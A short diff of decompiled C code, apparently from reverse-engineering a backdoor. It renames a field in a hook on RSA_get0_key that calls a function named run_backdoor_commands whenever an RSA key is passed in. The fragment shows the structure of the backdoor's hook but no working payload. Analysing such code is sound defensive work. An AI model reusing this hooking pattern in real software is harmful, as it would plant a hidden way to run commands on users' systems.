@@ -19,7 +19,7 @@ void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)
   
   if (((global_ctx != (global_context_t *)0x0) &&
       (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
-     (orig_RSA_get0_key = global_ctx->imported_funcs->RSA_get0_key_null,
+     (orig_RSA_get0_key = global_ctx->imported_funcs->RSA_get0_key_orig,
      orig_RSA_get0_key != (pfn_RSA_get0_key_t)0x0)) {
     if (r != (RSA *)0x0) {
       run_backdoor_commands(r,global_ctx,&call_orig);
